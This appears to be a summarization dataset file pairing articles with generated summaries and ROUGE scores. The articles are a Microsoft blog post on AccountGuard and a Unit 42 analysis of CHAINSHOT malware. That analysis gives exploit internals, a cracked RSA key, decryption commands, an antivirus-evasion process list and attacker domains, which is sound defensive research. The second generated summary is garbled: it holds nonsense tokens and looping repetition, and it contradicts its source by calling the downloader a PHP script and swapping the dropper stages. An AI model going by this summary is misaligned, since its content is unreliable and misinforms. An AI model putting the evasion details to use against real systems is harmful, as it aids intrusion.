0.971830985915493, 'f': 0.16696914543494773};{'r': 0.05431567625705835, 'p': 0.9351851851851852, 'f': 0.10266835982646338};{'r': 0.09133024487094639, 'p': 0.971830985915493, 'f': 0.16696914543494773}
https://blogs.microsoft.com/on-the-issues/2018/08/20/we-are-taking-new-steps-against-broadening-threats-to-democracy/;We are taking new steps against broadening threats to democracy;"It's clear that democracies around the world are under attack. Foreign entities are launching cyber strikes to disrupt elections and sow discord. Unfortunately, the internet has become an avenue for some governments to steal and leak information, spread disinformation, and probe and potentially attempt to tamper with voting systems. We saw this during the United States general election in 2016, last May during the French presidential election, and now in a broadening way as Americans are preparing for the November midterm elections.Broadening cyberthreats to both U.S. political parties make clear that the tech sector will need to do more to help protect the democratic process. Last week, Microsoft's Digital Crimes Unit (DCU) successfully executed a court order to disrupt and transfer control of six internet domains created by a group widely associated with the Russian government and known as Strontium, or alternatively Fancy Bear or APT28. We have now used this approach 12 times in two years to shut down 84 fake websites associated with this group. Attackers want their attacks to look as realistic as possible and they therefore create websites and URLs that look like sites their targeted victims would expect to receive email from or visit. The sites involved in last week's order fit this description.We're concerned that these and other attempts pose security threats to a broadening array of groups connected with both American political parties in the run-up to the 2018 elections. That's why today we are expanding Microsoft's Defending Democracy Program with a new initiative called Microsoft AccountGuard. This initiative will provide state-of-the-art cybersecurity protection at no extra cost to all candidates and campaign offices at the federal, state and local level, as well as think tanks and political organizations we now believe are under attack. The technology is free of charge to candidates, campaigns and related political institutions using Office 365.As a special master appointed by a federal judge concluded in the recent court order obtained by DCU, there is ""good cause"" to believe that Strontium is ""likely to continue"" its conduct. In the face of this continuing activity, we must work on the assumption that these attacks will broaden further. An effective response will require even more work to bring people and expertise together from across governments, political parties, campaigns and the tech sector.An expansion of political targetsLast week's order transferred control of the six internet domains listed below from Strontium to Microsoft, preventing Strontium from using them and enabling us to more closely look for evidence of what Strontium intended to do with the domains. These six domains are listed here:Importantly, these domains show a broadening of entities targeted by Strontium's activities. One appears to mimic the domain of the International Republican Institute, which promotes democratic principles and is led by a notable board of directors, including six Republican senators and a leading senatorial candidate. Another is similar to the domain used by the Hudson Institute, which hosts prominent discussions on topics including cybersecurity, among other important activities. Other domains appear to reference the U.S. Senate but are not specific to particular offices. To be clear, we currently have no evidence these domains were used in any successful attacks before the DCU transferred control of them, nor do we have evidence to indicate the identity of the ultimate targets of any planned attack involving these domains.Microsoft has notified both nonprofit organizations. Both have responded quickly, and Microsoft will continue to work closely with them and other targeted organizations on countering cybersecurity threats to their systems. We've also been monitoring and addressing domain activity with Senate IT staff the past several months, following prior attacks we detected on the staffs of two current senators.Despite last week's steps, we are concerned by the continued activity targeting these and other sites and directed toward elected officials, politicians, political groups and think tanks across the political spectrum in the United States. Taken together, this pattern mirrors the type of activity we saw prior to the 2016 election in the United States and the 2017 election in France.Our new Microsoft AccountGuard initiativeAccountGuard will provide three services that will cover both organizational and personal email accounts:Threat notification across accounts. The Microsoft Threat Intelligence Center will enable Microsoft to detect and provide notification of attacks in a unified way across both organizational and personal email systems. For political campaigns and other eligible organizations, when an attack is identified, this will provide a more comprehensive view of attacks against campaign staff. When verifiable threats are detected, Microsoft will provide personal and expedited recommendations to campaigns and campaign staff to secure their systems. Security guidance and ongoing education. Officials, campaigns and related political organizations will receive guidance to help make their networks and email systems more secure. This can include applying multi-factor authentication, installing the latest security updates and guidance for setting up systems that ensure only those people who need data and documents can access them. AccountGuard will provide updated briefings and training to address evolving cyberattack trends. Early adopter opportunities. Microsoft will provide preview releases of new security features on a par with the services offered to our large corporate and government account customers.You can read a more complete description of Microsoft AccountGuard in today's blog by Tom Burt, the corporate vice president who heads Microsoft's Customer Security and Trust group.Microsoft's Defending Democracy ProgramSince we launched Microsoft's Defending Democracy Program in April, we have focused on four priorities: protecting campaigns from hacking, protecting voting and the electoral process, increasing political advertising transparency, and defending against disinformation campaigns. In the coming months, we will offer AccountGuard in additional countries, as we continue to invest in and evolve other aspects of the Defending Democracy Program.Our Defending Democracy Program is an important piece of our work to protect customers and promote cyberdiplomacy around the world. While cybersecurity starts with Microsoft and other companies in the tech sector, it's ultimately a shared responsibility with customers and governments around the world. Together with our industry partners, we've launched the Cybersecurity Tech Accord, now endorsed by 44 leading tech companies to protect and empower civilians online and to improve the security, stability and resilience of cyberspace. And we will continue to call for stronger adherence to existing international norms and the creation of new international laws - like a Digital Geneva Convention.As last week's court order and today's AccountGuard initiative reflect, we are committed not only to stronger principles and laws but stronger action as well.A democracy requires vigilanceIn 1787, as the American constitutional convention reached its conclusion in Philadelphia, Benjamin Franklin was asked as he departed Independence Hall what type of government the delegates had created. He famously replied, ""A republic, if you can keep it.""We can only keep our democratic societies secure if candidates can run campaigns and voters can go to the polls untainted by foreign cyberattacks.Democracy requires vigilance and at times action by citizens to protect and maintain it. No individual or company can hope to meet this imperative by itself. We all need to do our part. We're committed to doing our part by helping to protect candidates and campaigns in preserving their voices and votes no matter what party they support.Tags: cybersecurity, Digital Crimes Unit, elections, Microsoft AccountGuard";Microsoft's AccountGuard initiative is designed to help protect candidates and campaigns in preserving their voices and votes no matter what party they support. This can include applying multifactor authentication, installing the latest security updates and guidance for setting up systems that ensure only those people who need data and documents can access them. AccountGuard will provide updated briefings and training to address evolving cyberattack trends. Early adopter opportunities. Microsoft will provide preview releases of new security features on a par with the services offered to our large corporate and government account customers. You can read a more complete description of Microsoft AccountGuard in today's blog by Tom Burt, the corporate vice president who heads Microsoft's Customer Security and Trust group.Microsoft's Defending Democracy ProgramSince we launched Microsoft's Defending Democracy Program in April, we have focused on four priorities: protecting campaigns from hacking, protecting voting and the electoral process, increasing political advertising transparency, and defending against disinformation campaigns. In the coming months, we will offer AccountGuard in additional countries, as we continue to invest in and evolve other aspects of the Defending Democracy Program.Our Defending Democracy Program is an important piece of our work to protect customers and promote cyberdiplomacy around the world. While cybersecurity starts with Microsoft and other companies in the tech sector, it's ultimately a shared responsibility with customers and governments around the world. Together with our industry partners, we've launched the Cybersecurity Tech Accord, now endorsed by 44 leading tech companies to protect and empower civilians online and to improve the security, stability and resilience of cyberspace. And we will continue to call for stronger adherence to existing international norms and the creation of new international laws like a Digital Geneva;en;{'r': 0.3142361111111111, 'p': 0.9890710382513661, 'f': 0.4769433428490785};{'r': 0.23919043238270468, 'p': 0.9701492537313433, 'f': 0.3837638344650427};{'r': 0.3142361111111111, 'p': 0.9890710382513661, 'f': 0.4769433428490785}
https://unit42.paloaltonetworks.com/unit42-slicing-dicing-cve-2018-5002-payloads-new-chainshot-malware/;Slicing and Dicing CVE-2018-5002 Payloads: New CHAINSHOT Malware;"This story begins with one of our blog authors, who, following the discovery of a new Adobe Flash 0-day, found several documents using the same exploit that were used in targeted attacks. We were also able to collect network captures including the encrypted malware payload. Armed with these initial weaponized documents, we uncovered additional attacker network infrastructure, were able to crack the 512-bit RSA keys, and decrypt the exploit and malware payloads. We have dubbed the malware 'CHAINSHOT', because it is a targeted attack with several stages and every stage depends on the input of the previous one.This blog describes the process we took to analyze the malware, how we managed to decrypt the payloads, and then how we found parts of a new attack framework. We also found additional network infrastructure which indicates similar attacks were conducted against a wide range of targets with disparate interests. This attack chain is designed in a way that makes it very difficult to execute a single part on its own, be it the exploit or payload. To make our analysis easier, we reproduced the server-side infrastructure, by doing so we were able to conduct dynamic analysis and get a better understanding how the exploit and payload work together.This serves as a follow-up of Icebrg's article which describes the initial findings.Cracking a RSA KeyFirst, let's recap how the overall attack chain works to understand at which point the RSA key is needed. The malicious Microsoft Excel document contains a tiny Shockwave Flash ActiveX object with the following properties:Figure 1. Malicious Shockwave Flash ActiveX object propertiesThe ""Movie"" property contains a URL to a Flash application which is downloaded in cleartext and then executed. The ""FlashVars"" property contains a long string with 4 URLs which are passed to the downloaded Flash application. The Flash application is an obfuscated downloader which creates a random 512-bit RSA key pair in memory of the process. While the private key remains only in memory, the public keys' modulus n is sent to the attacker's server. On the server side, the modulus is used together with the hardcoded exponent e 0x10001 to encrypt the 128-bit AES key which was used previously to encrypt the exploit and shellcode payload. The encrypted exploit or payload is sent back to the downloader which uses the in-memory private key to decrypt the AES key and the exploit or payload.As the modulus is sent to the server of the attacker, it's also in our network capture. Together with the hardcoded exponent we have the public key which we can use to get the private key. Keep in mind that this was only possible because the attacker chose a key length of 512-bit which is known to be insecure. In order to do so, we have to factorize the modulus n into its two prime numbers p and q. Luckily this problem has already been solved previously, by an awesome public project 'Factoring as a Service'. The project uses Amazon EC2's high computing power and can factorize large integers in just a matter of hours.Following this logic, let's take the following modulus of the public key sent to the attacker's server to get the shellcode payload.Figure 2. HTTP POST request for the encrypted shellcode payload with the modulus n in hexadecimalAfter removing the first 2 bytes which are used in this case to retrieve the 32-bit version of the shellcode payload, we have the following modulus in hexadecimal:0x7df305d5bcc659e5497e482bd0b507c44808deee8525f24b2712dc4a29f5c44e1e08c889a64521bbc67136ced11ace55b9bc2c1c7c96630aa515896b2f7341fd 1 0x7df305d5bcc659e5497e482bd0b507c44808deee8525f24b2712dc4a29f5c44e1e08c889a64521bbc67136ced11ace55b9bc2c1c7c96630aa515896b2f7341fdAfter we have factorized the integer, we get the following two prime numbers in decimal:P58243340170108004196473690380684093596548916771782361843168584750033311384553 1 58243340170108004196473690380684093596548916771782361843168584750033311384553Q113257592704268871468251608331599268987586668983037892662393533567233998824693 1 113257592704268871468251608331599268987586668983037892662393533567233998824693With the help of p and q we can calculate the private key. We used a small public tool to create it in Privacy Enhanced Mail (PEM) format:-----BEGIN RSA PRIVATE KEY----- MIIBOgIBAAJAffMF1bzGWeVJfkgr0LUHxEgI3u6FJfJLJxLcSin1xE4eCMiJpkUh u8ZxNs7RGs5VubwsHHyWYwqlFYlrL3NB/QIDAQABAkBog3SxE1AJItIkn2D0dHR4 dUofLBCDF5czWlxAkqcleG6im1BptrNWdJyC5102H/bMA9rhgQEDHx42hfyQiyTh AiEA+mWGmrUOSLL3TXGrPCJcrTsR3m5XHzPrh9vPinSNpPUCIQCAxI/z9Jf10ufN PLE2JeDnGRULDPn9oCAqwsU0DWxD6QIhAPdiyRseWI9w6a5E6IXP+TpZSu00nLTC Sih+/kxvnOXlAiBZMc7VGVQ5f0H5tFS8QTisW39sDC0ONeCSPiADkliwIQIhAMDu 3Dkj2yt7zz04/H7KUV9WH+rdrhUmoGhA5UL2PzfP -----END RSA PRIVATE KEY----- 1 2 3 4 5 6 7 8 9 -- -- - BEGIN RSA PRIVATE KEY -- -- - MIIBOgIBAAJAffMF1bzGWeVJfkgr0LUHxEgI3u6FJfJLJxLcSin1xE4eCMiJpkUh u8ZxNs7RGs5VubwsHHyWYwqlFYlrL3NB / QIDAQABAkBog3SxE1AJItIkn2D0dHR4 dUofLBCDF5czWlxAkqcleG6im1BptrNWdJyC5102H / bMA9rhgQEDHx42hfyQiyTh AiEA + mWGmrUOSLL3TXGrPCJcrTsR3m5XHzPrh9vPinSNpPUCIQCAxI / z9Jf10ufN PLE2JeDnGRULDPn9oCAqwsU0DWxD6QIhAPdiyRseWI9w6a5E6IXP + TpZSu00nLTC Sih + / kxvnOXlAiBZMc7VGVQ5f0H5tFS8QTisW39sDC0ONeCSPiADkliwIQIhAMDu 3Dkj2yt7zz04 / H7KUV9WH + rdrhUmoGhA5UL2PzfP -- -- - END RSA PRIVATE KEY -- -- -With the help of the private key we could now decrypt the 128-bit AES key. We used OpenSSL to do this:openssl rsautl -decrypt -in enc_aes.bin -out dec_aes.bin -inkey private_key.pem 1 openssl rsautl - decrypt - in enc_aes . bin - out dec_aes . bin - inkey private_key . pemThe encrypted AES key is extracted from the encrypted binary blob as described by Icebrg. It's at offset 0x4 and has the length of 0x40 bytes. Encrypted AES key:0x5BC64C5DC7EC96750CCB466935ED2183FE90212CB1BF6305F0B79B4B9D9261A4AC8A3E06F3E07D4037A40F4E221BB12E05B4DE2682B31617F177712BD12B501A 1 0x5BC64C5DC7EC96750CCB466935ED2183FE90212CB1BF6305F0B79B4B9D9261A4AC8A3E06F3E07D4037A40F4E221BB12E05B4DE2682B31617F177712BD12B501ADecrypted AES key:0xE4DF3353FD6D213E7400EEDA8B164FC0 1 0xE4DF3353FD6D213E7400EEDA8B164FC0Now that we have the decrypted AES key, we can decrypt the actual payload. The Flash downloader uses a custom initialization vector (IV) for the AES algorithm which can be found at offset 0x44 in the encrypted blob and is 16 bytes long:0xCC6FC77B877584121AEBCBFD4C23B67C 1 0xCC6FC77B877584121AEBCBFD4C23B67CFor the final decryption we used OpenSSL again:openssl enc -nosalt -aes-128-cbc -d -in payload.bin -out decrypted_payload -K E4DF3353FD6D213E7400EEDA8B164FC0 -iv CC6FC77B877584121AEBCBFD4C23B67C 1 openssl enc - nosalt - aes - 128 - cbc - d - in payload . bin - out decrypted_payload - K E4DF3353FD6D213E7400EEDA8B164FC0 - iv CC6FC77B877584121AEBCBFD4C23B67CThe decrypted shellcode payload is additionally compressed with zlib which can be seen by looking at the first 2 magic bytes 0x789C. We decompressed it with Offzip. Finally, we have the decrypted shellcode payload. The same procedure can be used to decrypt the Flash exploit which isn't additionally zlib compressed.Server-side ReproductionAfter we had the decrypted Flash exploit and shellcode payloads, we started to do a static analysis which turned out to be a quite tedious task. This is due to the obfuscation in the exploit and the complexity of shellcode payload which contains its own two PE payloads. Next, we attempted to do a dynamic analysis which quickly turned out to be impossible, because every stage relies on data passed from the previous. The shellcode payload does not execute properly without the data passed to it from the exploit. The exploit does not execute on its own without the variables passed from the downloader and so on.Due to the difficulties of analyzing the code statically, we decided to reproduce a simplified version of the server-side PHP scripts in order to make a full dynamic analysis possible. As we had the decrypted exploit, shellcode payload and the PCAP, we had all the information required to do so. Specifically, we created the following setup:Local Apache server with XAMPP, with the domain used in the attack configured to resolve to localhostA directory structure which mirrored that on the attackers' servers (as specified in the PCAPs)Setting of custom HTTP headers as per the PCAPs' responses.All of the requested files are sent back gzip encoded, otherwise the attack chain doesn't work. We have uploaded the PHP scripts to our GitHub account, so you can also play with the different stages and see how it works.Additional Details of the Flash ExploitWhile the exploit has been already described, we want to give some additional details surrounding it that we found during our analysis. In particular, we were interested in the part which transfers execution to the shellcode payload. While most parts of the decompiled ActionScript exploit code are obfuscated, luckily some method names were left in cleartext.Because the decrypted shellcode payload doesn't run on its own when transformed into an executable, we have to figure out how execution works and if one or more parameters are passed. Therefore, the most interesting method for us is ""executeShellcodeWithCfg32"" which indicates we can find the passed data in it. It creates a small shellcode template and fills some placeholder values at runtime. The disassembled template looks as follows:Figure 3. Shellcode template with placeholders (red) in the Flash exploit to pass execution to the shellcode payloadWhile the final prepared shellcode looks as follows:Figure 4. Runtime version of the shellcode template with filled placeholdersLet's take a look at what values are set to the placeholders (0x11111111, 0x22222222, ...). The address 0xA543000 in Figure 4 is the entrypoint of the decrypted shellcode payload which has a small NOP sled in front of the actual code:Figure 5. Entrypoint of the shellcode template in memoryThe address 0x771A1239 in Figure 4 is in the middle of the function NtPrivilegedServiceAuditAlarm in ntdll.dll:Figure 6. Windows API function NtPrivilegedServiceAuditAlarmHowever, we can also see in Figure 4 that before calling the API function via ""call edx"", the value 0x4D is moved into eax which is the ID of the API function NtProtectVirtualMemory. By doing so, the function NtProtectVirtualMemory is executed without calling it directly. This trick is likely used to bypass AVs/sandboxes/anti-exploit software which hook NtProtectVirtualMemory and the attacker probably chose NtPrivilegedServiceAuditAlarm as a trampoline as it's unlikely to be ever be monitored.The data at this address 0x9DD200C in Figure 4 looks like a structure into which the last NTSTATUS return value of NtProtectVirtualMemory is copied. The address of this structure seems to be passed to the shellcode payload in ebx, however we haven't figured out what's its purpose is. Finally, shellcode payload is executed via ""call edi""To sum up, the memory access rights of the shellcode payload are changed in 0x1000 byte blocks to RWE via NtProtectVirtualMemory. The last NTSTATUS code is saved into memory pointed to by ebx and the shellcode payload is executed.Another interesting aspect of the exploit code is that it sends status messages when something goes wrong at every stage of the exploitation. These status messages are very similar to those send by the initial Flash downloader and are sent to the attacker's server via fake PNG files (see Icebrg). They also contain the ""/stab/"" directory in the URL and the actual message is also sent encoded via custom digit combinations. However, the status message of the exploitation code contains additional information in the form of abbreviations of the appropriate stage. By looking at those messages, we can get a better understanding how the exploit works. The following messages are possible:Status message code Description 2-0-9-vp Short for VirtualProtect 2-0-9-g3 Short for something like gadget3 (ROP gadget) cause a byte array is created 0x5A5941584159C3 which disassembles to: pop edx pop ecx inc ecx pop eax inc ecx pop ecx retn 2-0-9-RtlAllocateHeap Self-explaining 2-0-9-DeleteDC Self-explaining 2-0-9-GetDC Self-explaining 2-0-9-sprintf Self-explaining 2-0-9-VP Short for VirtualProtect 2-0-9-RU Short for RtlUnwind 2-0-9-NVP Short for NtProtectVirtualMemory 2-0-9-NPSAA Short for NtPrivilegedServiceAuditAlarm 2-0-9-G Probably short for Gadget 2-0-9-SRP Short for something like StackReturnProcedure because two-byte arrays 0x81C4D8000000C3 and 0x81C4D0000000C3 are created which disassemble to: add esp, 0D8h retn - and - add esp, 0D0h retn 2-0-9-PAX Short for something like PopEAX as a byte array 0x58C3 is created before which disassembles to: pop eax retnTable 1. Status messages used in the Flash exploit codeThe Shellcode PayloadAfter the exploit successfully gains RWE permissions, execution is passed to the shellcode payload. The shellcode loads an embedded DLL internally named FirstStageDropper.dll, which we call CHAINSHOT, into memory and runs it by calling its export function ""__xjwz97"". The DLL contains two resources, the first is x64 DLL internally named SecondStageDropper.dll and the second is a x64 kernelmode shellcode.FirstStageDropper.dll is responsible for injecting SecondStageDropper.dll into another process to execute it. While the shellcode payload only contains code to search for and bypass EMET, FirstStageDropper.dll also contains code for Kaspersky and Bitdefender. In case of EMET, it searches the loaded modules for emet.dll and emet64.dll, for Kaspersky it searches for klsihk.dll, and for Bitdefender it searches for avcuf32.dll and avcuf64.dll. It also collects and sends encrypted user system and process information data together with a unique hardcoded ID to the attacker's server. The data is sent to URLs that contain ""/home/"" and ""/log/"" directories and for encryption it uses the Rijndael algorithm. As the attacker server did not respond at the time of our analysis, we guess a command is sent back to execute the SecondStageDropper.dll.While the samples we obtained inject SecondStageDropper.dll in usermode via thread injection, the x64 shellcode seems to have an option to inject it from kernelmode. However, we haven't figured out what the exact purpose of it is, since it's never executed, it also searches for an additional resource which wasn't present in the samples we analyzed.The kernelmode shellcode contains parts of Blackbone, an open source library for Windows memory hacking. The following functions are taken from its code:FindOrMapModuleBBQueueUserApcBBCallRoutineBBExecuteInNewThreadIt also contains code from TitanHide, using identical code to lookup SSDT in Win7 and Win10 as described by the author.SecondStageDropper.dll acts as a downloader for the final payload. It collects various information from the victim system, encrypts it, and sends it to the attacker's server. It also scans for the following processes and skips execution if found:Process name Security Solution adawareservice.exe adawareservicetray.exe Adaware mbam.exe Malwarebytes bdagent.exe bdwtxag.exe seccecenter.exe (contains a typo, should be seccenter.exe) vsserv.exe updatesrv.exe odscanui.exe odsw.exe Bitdefender efainst.exe elaminst.exe instca.exe mcui32.exe navw32.exe ncolow.exe nsbu.exe srtsp_ca.exe symdgnhc.exe symerr.exe tuih.exe wfpunins.exe wscstub.exe Symantec / Norton avp.exe Kaspersky HitmanPro.exe Sophos / HitmanPro abcde.exe ?Table 2. Process name lookup listUnfortunately, at the time of the analysis we were unable to obtain additional files, so we were unable to figure out what the final stage is. However, CHAINSHOT contacts the following domains via HTTPS to get the final payload:contact.planturidea[.]netdl.nmcyclingexperience[.]comtools.conductorstech[.]comIn both samples we analyzed the final domains used were the same. We have obtained two x86 versions of the shellcode payload with its embedded PE files and the kernelmode shellcode. While the shellcode payload, FirstStageDropper.dll and kernel shellcode do not differ, the SecondStageDropper.dll contains a couple of different strings. The following strings are different, possibly indicating they are changed for every victim, with the final payload directory being an MD5 representation of the ""project name"" or something similar.Sample 1 Sample 2 User-agent Mozilla/5.0 (Windows NT 6.4, WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36 Edge/12.0 Mozilla/5.0 (Windows NT 6.3, Win64, x64, rv:10.0) Gecko/20100101 Firefox/10.0 Queried final payload directories /0cd173cf1caa2aa03a52b80d7521cc75e /1cd173cf1caa2aa03a52b80d7521cc75e /0fa0a5fc0d2e28cc3786e5d6eb273f1fa /1fa0a5fc0d2e28cc3786e5d6eb273f1fa Unique string used in network communication 148a028d-57c6-4094-b07d-720df09246dd 3784113f-b04e-4c1e-b3be-6b0a22464921Table 3. String differences in SecondStageDropper.dllThe shellcode payload and PE files partly contain the same code indicating a framework was used to create them. For example, both the shellcode and CHAINSHOT itself make extensive use of the same exception handling with custom error codes. They also both use the same code to scan for and bypass EMET. Furthermore, other parts such as the OS version recognition are identical in all samples and the PE files' compilation timestamps are zeroed out. Another interesting fact is that FirstStageDropper.dll also sends status messages back to the attacker starting with digit ""9"". For example, the following network capture from our local tests show a successful network communication up to the point where the attacker presumably sends back the command to execute SecondStageDropper.dll:Figure 7. Network capture of a successful attack reproduced locally in a VMAdditional InfrastructureOne of the domains reported by IceBrg had an associated SSL certificate which was documented in their write up. By searching for other IP addresses using the same certificate we were able to find a large number of associated domains that were likely also used in similar attack campaigns. Just like the domain contacted within the Excel documents analyzed, the additional domain names are created in a similar way using similar hosting providers and registrars and used names which are very similar to official websites to avoid suspicion. The list of domains can be found in the IOC section.ConclusionWe uncovered part of a new toolkit which was used as a downloader alongside Adobe Flash exploit CVE-2018-5002 to target victims in the Middle East. This was possible because the attacker made a mistake in using insecure 512-bit RSA encryption. The malware sends user information encrypted to the attacker server and attempts to download a final stage implant. It was allegedly developed with the help of an unknown framework and makes extensive use of custom error handling. Because the attacker made another mistake in using the same SSL certificate for similar attacks, we were able to uncover additional infrastructure indicating a larger campaign.Palo Alto Networks customers are protected from this threat in the following ways:WildFire detects all malicious Excel documents, the Flash downloader and exploit and all CHAINSHOT samples with malicious verdictsAutoFocus customers can track the samples with the CVE-2018-5002 exploit and CHAINSHOT malware tagsTraps detects and blocks the malicious Excel documents with the Flash exploitFinally, we'd like to thank Tom Lancaster for his assistance in this investigation.Indicators of CompromiseAdobe Flash Downloader189f707cecff924bc2324e91653d68829ea55069bc4590f497e3a34fa15e155cAdobe Flash Exploit (CVE-2018-5002)3e8cc2b30ece9adc96b0a9f626aefa4a88017b2f6b916146a3bbd0f99ce1e497CHAINSHOT SamplesX86 Shellcode Payloads:d75de8f7a132e0eb922d4b57f1ce8db47dfcae4477817d9f737762e4862837952d7cb5ff4a449fa284721f83e352098c2fdea125f756322c90a40ad3ebc5e40dFirstStageDropper.dll:a260d222dfc94b91a09485647c21acfa4a26469528ec4b1b49469db3b283eb9aa09273b4cc08c39afe0c964f14cef98e532ae530eb60b93aec669731c185ea23SecondStageDropper.dll:43f7ae58e8e5471917178430f3425061d333b736974f4b2784ca543e3093204b3485c9b79dfd3e00aef9347326b9ccfee588018a608f89ecd6597da552e3872fInfrastructureftp[.]oceasndata[.]comdl[.]beanfile[.]comeukaznews[.]comexclusivesstregis[.]comfishing-uae[.]comapi[.]usecisco[.]infogulfnews[.]uae-travel-advisories[.]comqatar[.]eng-theguardian[.]commalomatiaa[.]comnews[.]theqatarpeninsula[.]compeople[.]dohabayt[.]comqatar[.]doharotanatimes[.]comsites[.]oceasndata[.]comqatar[.]smallwarjournal[.]comqatarembassies[.]comsa[.]eukaznews[.]comsec[.]oceasndata[.]comrss[.]beanfile[.]comusecisco[.]infosmallwarjournal[.]comawareness-qcert[.]netspecials[.]fishing-uae[.]comtheqatarpeninsula[.]comuae-travel-advisories[.]comeng-theguardian[.]comsecurityandpolicing[.]meapi[.]qcybersecurity[.]orgqatar-sse[.]comapi[.]motc-gov[.]infoyouraccount-security-check[.]comapi[.]exclusivesstregis[.]comnewhorizonsdoha[.]comsandp2018[.]securityandpolicing[.]meicoinico[.]oneapi[.]dohabayt[.]comthelres[.]comnews[.]gulf-updates[.]comqatarconferences[.]thelres[.]comapi[.]smallwarjournal[.]comqcybersecurity[.]orgikhwan-portal[.]comgulf-updates[.]comapi[.]qatar-sse[.]cominfo[.]awareness-qcert[.]netapi[.]newhorizonsdoha[.]cominternationsplanet[.]comwww[.]winword[.]cowww[.]oceasndata[.]compeople[.]dohabayt[.]comeng-defenseadvisers[.]commotc-gov[.]infobeanfile[.]comnews[.]eng-defenseadvisers[.]comwinword[.]codocuments[.]malomatiaa[.]combern[.]qatarembassies[.]comsurveydoha[.]comdocuments[.]malomatiaa[.]comdohabayt[.]comdoharotanatimes[.]comactivity[.]youraccount-security-check[.]compoll[.]surveydoha[.]comapi[.]thelres[.]comq-miles[.]comrewards[.]q-miles[.]comoceasndata[.]comapi[.]people[.]dohabayt[.]combangkok[.]exclusivesstregis[.]comevents[.]ikhwan-portal[.]comcontact[.]planturidea[.]netdl[.]nmcyclingexperience[.]comtools[.]conductorstech[.]com";"The malicious Microsoft Excel document contains a tiny Shockwave Flash ActiveX object with the following properties:Figure 1. Malicious Shockwave Flash ActiveX object propertiesThe ""Movie"" property contains a URL to a Flash application which is downloaded in cleartext and then executed. The ""FlashVars"" property contains a long string with 4 URLs which are passed to the downloaded Flash application. The Flash application is an obfuscated downloader which creates a random 512bit RSA key pair in memory of the process. While the private key remains only in memory, the public keys' modulus n is sent to the attacker's server. On the server side, the modulus is used together with the hardcoded exponent e 0x10001 to encrypt the 128bit AES key which was used previously to encrypt the exploit and shellcode payload. The encrypted exploit or payload is sent back to the downloader which uses the inmemory private key to decrypt the AES key and the exploit or payload.As the modulus is sent to the server of the attacker, it's also in our network capture. Together with the hardcoded exponent we have the public key which we can use to get the private key. Keep in mind that this was only possible because the attacker chose a key length of 512bit which is known to be insecure. In order to do so, we have to factorize the modulus n into its two prime numbers p and q. Luckily this problem has already been solved previously, by an awesome public project 'Factoring as a Service'. The report. Evaluable. feward, the IT, of 10few of 1000, the text, the text, a few. feward, the 10 of 10 of 10 of 10, the text, the 10 of the 10000 of 10 of 10, the (out, the 10, the 10. . . . . . . . . . [10. . of the following of the 1. [Fur, the ##, the 1, the 10 of the 1. ##, a few, a few. . The ITSecurity report is a comprehensive analysis of the malware used in the attack. It describes the malware in detail, including the exploit, the shellcode payload, and the downloader. The exploit is a Flash exploit that takes advantage of a vulnerability in the Adobe Flash Player. The shellcode payload is a small shellcode program that is executed by the exploit. The downloader is a PHP script that downloads the malware from a remote server and executes it on the victim's computer. The report describes the malware in detail, including the exploit, the shellcode payload, and the downloader. The exploit is a Flash exploit that takes advantage of a vulnerability in the Adobe Flash Player. The shellcode payload is a small shellcode program that is executed by the exploit. The downloader is a PHP script that downloads the malware from a remote server and executes it on the victim's computer. The report describes the malware in detail, including the exploit, the shellcode payload, and the downloader. The exploit is a Flash exploit that takes advantage of a vulnerability in the Adobe Flash Player. The shellcode payload is a small shellcode program that is executed by the exploit. The downloader is a PHP script that downloads the malware from a remote server and executes it on the victim's computer. The report describes the malware in detail, including the exploit, the shellcode payload, and the downloader. The exploit is a Flash exploit that takes advantage of a vulnerability in the Adobe Flash Player. The shellcode payload is a small shellcode program that is executed by the exploit. The downloader is a PHP script that downloads the malware from a remote server and executes it on the victim's computer. The report describes the malware in detail, including the exploit, the shellcode payload The shellcode payload is responsible for injecting SecondStageDropper.dll into another process to execute it. While the shellcode payload only contains code to search for and bypass EMET, FirstStageDropper.dll also contains code for Kaspersky and Bitdefender. In case of EMET, it searches the loaded modules for emet.dll and emet64.dll, for Kaspersky it searches for klsihk.dll, and for Bitdefender it searches for avcuf32.dll and avcuf64.dll. It also collects and sends encrypted user system and process information data together with a unique hardcoded ID to the attacker's server. The data is sent to URLs that contain ""/home/"" and ""/log/"" directories and for encryption it uses the Rijndael algorithm. The ITSecurity report is summarized as follows: The attacker is using a multistage approach to infect the victim's system. FirstStageDropper.dll acts as a downloader for the final payload. It collects various information from the victim system, encrypts it, and sends it to the attacker's server. It also scans for the following processes and skips execution if found:Process name Security Solution adawareservice.exe adawareservicetray.exe Adaware mbam.exe Malwarebytes bdagent.exe bdwtxag.exe seccecenter.exe (contains a typo, should be seccenter.exe) vsserv.exe updatesrv.exe odscanui.exe odsw.exe Bitdefender efainst.exe elaminst.exe instca.exe mcui32.exe navw32.exe ncolow.exe nsbu.exe srtsp_ca.exe symdgnhc.exe symerr.exe tuih.exe wfpunins.exe wscstub.exe Symantec / Norton avp.exe Kaspersky HitmanPro.exe Sophos / HitmanPro abcde.exe ?Table 2. Process name lookup listUnfortunately, at the time of the analysis we were unable to obtain additional files, so we were unable to figure out what the final stage is. However, CHAINSHOT contacts the following domains via HTTPS to get the final payload:contact.planturidea[.]netdl.nmcyclingexperience[.]comtools.conductorstech[. ]comIn both samples we analyzed the final domains used were the same. We have obtained two x86 versions of the shellcode payload with its embedded PE files and the kernel mode shellcode. While the The malware is detected and blocked.";en;{'r': 0.2594296228150874, 'p': 0.8676923076923077, 'f': 0.39943342421820466};{'r': 0.21038961038961038, 'p': 0.7980295566502463, 'f': 0.33299074695483083};{'r': 0.2575896964121435, 'p': 0.8615384615384616, 'f': 0.3966005630284029}
